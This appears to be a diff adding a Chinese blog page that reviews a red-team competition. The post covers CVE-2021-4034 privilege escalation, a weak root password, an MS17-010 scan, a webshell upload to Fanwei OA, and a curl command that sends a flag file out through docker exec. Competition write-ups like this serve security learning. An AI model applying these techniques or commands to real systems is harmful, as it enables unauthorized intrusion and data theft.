@@ -1,0 +1,639 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="ki10Moc" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      PCL-Final复盘 
+      
+      
+      |
+    
+     ki10Moc&#39;s World
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/1.png">
+    <link rel="icon" href="/images/1.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/color-scheme.css">
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+<link rel="stylesheet" href="/css/comments.css">
+
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-RG82N8DQZ9"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+
+      gtag('config', 'G-RG82N8DQZ9');
+    </script>
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="ki10Moc's World" type="application/atom+xml">
+</head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/1.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">ki10Moc</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">主页</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">标签</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">友链</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">ki10Moc</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">PCL-Final复盘</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="Update time"></i>
+          2023-11-21 23:00:00
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags" title="Tags"></i>
+                
+                <span class="span--tag">
+                  <a href="/tags/%E6%B8%97%E9%80%8F/" title="渗透">
+                    <b>#</b> 渗透
+                  </a>
+                </span>
+                
+                <span class="span--tag">
+                  <a href="/tags/RedTeam/" title="RedTeam">
+                    <b>#</b> RedTeam
+                  </a>
+                </span>
+                
+                <span class="span--tag">
+                  <a href="/tags/%E7%BA%BF%E4%B8%8B%E8%B5%9B%E5%A4%8D%E7%9B%98/" title="线下赛复盘">
+                    <b>#</b> 线下赛复盘
+                  </a>
+                </span>
+                
+                <span class="span--tag">
+                  <a href="/tags/%E4%BA%BA%E7%94%9F/" title="人生">
+                    <b>#</b> 人生
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <p>部分关键步骤忘记截图了。。。</p>
+<h3 id="day1水务安全"><a class="markdownIt-Anchor" href="#day1水务安全">#</a> Day1 水务安全</h3>
+<p>是个 OA，上来直接嗦，第一个 flag 没截图</p>
+<p>翻配置文件，php 文件做了混淆，看备份文件 bak</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/2.png" alt="2"></p>
+<p>连上数据库拿到 flag</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/1.png" alt="1"></p>
+<p>然后一把嗦内网，挂代理</p>
+<p>内网一个 weblogic</p>
+<p>里面有两个 flag</p>
+<p>这是其中一个可以直接读取的</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/3.png" alt="3"></p>
+<p>还有一个在根目录的 flag.txt</p>
+<p>看下 history 提到了 CVE-2021-4034</p>
+<p>用准备好的样本直接命令执行，但是读取有点问题，就通过执行 &gt;  <code>cat flag.txt</code>  直接把 flag 重定向成文件名</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/4.png" alt="4"></p>
+<h3 id="day2金融安全第三问"><a class="markdownIt-Anchor" href="#day2金融安全第三问">#</a> Day2 金融安全第三问</h3>
+<p>非预期</p>
+<p>爆破出来服务器 root/123456</p>
+<p>flag 在 /srv/flag</p>
+<p>没截图。。。</p>
+<p>机器拿到的时候是不回显的，就在本地写了一个</p>
+<p>file_put_content，把执行的 POST [1] 参数内容放入到 1.txt</p>
+<p>然后再机器上执行 curl -d  <code>docker exec -it 53af5882ce3f cat /srv/flag &gt; 1.txt </code></p>
+<h3 id="day3政务安全"><a class="markdownIt-Anchor" href="#day3政务安全">#</a> Day3 政务安全</h3>
+<p>给了几个站点，没有截图也不记得叫什么了。。。</p>
+<p>截取的扫描结果</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[+] 10.10.2.11  MS17-010        (Windows 7 Ultimate 7601 Service Pack 1)</span><br><span class="line">[*] WebTitle: http://10.10.4.2:9010     code:307 len:57     title:None 跳转url: http://10.10.4.2:9001</span><br><span class="line">[*] WebTitle: http://10.10.2.2:8080     code:403 len:555    title:403 Forbidden</span><br><span class="line">[*] WebTitle: http://10.10.2.3:8080     code:403 len:548    title:403 Forbidden</span><br><span class="line">[*] WebTitle: http://10.10.4.3:8080     code:200 len:11197  title:Apache Tomcat/7.0.76</span><br><span class="line">[*] WebTitle: http://10.10.4.2:9080     code:200 len:23167  title:Portainer</span><br><span class="line">[+] 10.10.4.6   MS17-010        (Windows 7 Ultimate 7601 Service Pack 1)</span><br><span class="line">[+] 10.10.1.17  MS17-010        (Windows 7 Ultimate 7601 Service Pack 1)</span><br></pre></td></tr></table></figure>
+<p>直接打</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/tmd.png" alt="tmd"></p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/tmd2.png" alt="tmd2"></p>
+<p>然后准备进一步扩大成果的时候，剩余两台机器和这台机器直接全没了，不清楚是哪位大哥还是主办方环境有问题。。。。</p>
+<h3 id="day3企业对抗"><a class="markdownIt-Anchor" href="#day3企业对抗">#</a> Day3 企业对抗</h3>
+<p>泛微 OA 未授权</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231122004702085.png" alt="image-20231122004702085"></p>
+<p>任意文件上传</p>
+<p>这里马子连上就掉，后面干脆连不上，还会一直删除，然后五个环境要么没有 www 权限，要么路由删了，要么直接崩了。。。。</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231122004746901.png" alt="image-20231122004746901"></p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231122004802343.png" alt="image-20231122004802343"></p>
+<p>任意文件读取</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231122004936764.png" alt="image-20231122004936764"></p>
+<p>总结：</p>
+<p>第二天的那个 supershell，默认秘钥没进去很亏，少刷一个内网</p>
+<p>然后是一些 payload 准备的不充分，kali 环境桥接模式下，静态 IP 的文件忘记了位置，导致前面不能方便的上工具</p>
+<p>内网一些知识还是比较模糊的，比赛时手忙脚乱。心态也不稳定，如果渗透的出现偏差就会打的畏手畏脚</p>
+<p>渗透相对打的确实很少，回去后要多加强红队的技能和知识体系。</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2023/10/18/Nacos%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="Update time"></i>
+              2023-11-21 23:00:00
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags" title="Tags"></i>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/%E6%B8%97%E9%80%8F/" title="渗透">
+                        <b>#</b> 渗透
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/RedTeam/" title="RedTeam">
+                        <b>#</b> RedTeam
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/%E7%BA%BF%E4%B8%8B%E8%B5%9B%E5%A4%8D%E7%9B%98/" title="线下赛复盘">
+                        <b>#</b> 线下赛复盘
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/%E4%BA%BA%E7%94%9F/" title="人生">
+                        <b>#</b> 人生
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2023/12/05/HTB-codify/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#day1%E6%B0%B4%E5%8A%A1%E5%AE%89%E5%85%A8"><span class="toc-text"> Day1 水务安全</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#day2%E9%87%91%E8%9E%8D%E5%AE%89%E5%85%A8%E7%AC%AC%E4%B8%89%E9%97%AE"><span class="toc-text"> Day2 金融安全第三问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#day3%E6%94%BF%E5%8A%A1%E5%AE%89%E5%85%A8"><span class="toc-text"> Day3 政务安全</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#day3%E4%BC%81%E4%B8%9A%E5%AF%B9%E6%8A%97"><span class="toc-text"> Day3 企业对抗</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/ki10Moc/">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="email" href="ki10Moc1949@gmail.com">
+            <i class="iconfont icon-envelope"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="facebook" target="_blank" rel="noopener" href="https://www.facebook.com/profile.php?id=100083345720708">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="twitter" target="_blank" rel="noopener" href="https://twitter.com/ki10moc1/status/1494844731544662019?s=21&t=l-0lygAzRMHeJeBklnPt-A">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/ki10Moc/">Copyright © 2025 ki10Moc</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/ki10Moc/">霍布斯鲍姆学徒 | CTFer</a>
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + PCL-Final%E5%A4%8D%E7%9B%98 + '&url=' + https%3A%2F%2Fki10moc.github.io%2F2023%2F11%2F21%2FPCL-Final%25E5%25A4%258D%25E7%259B%2598%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://ki10moc.github.io/2023/11/21/PCL-Final%E5%A4%8D%E7%9B%98/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
